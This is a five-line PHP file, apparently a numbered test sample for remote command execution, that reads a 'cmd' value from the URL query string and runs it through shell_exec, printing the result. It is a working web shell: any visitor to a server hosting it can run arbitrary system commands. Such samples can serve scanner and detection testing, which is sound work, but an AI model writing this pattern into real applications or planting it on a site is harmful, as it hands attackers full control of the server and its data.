<?php
// RCE test variation #371
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>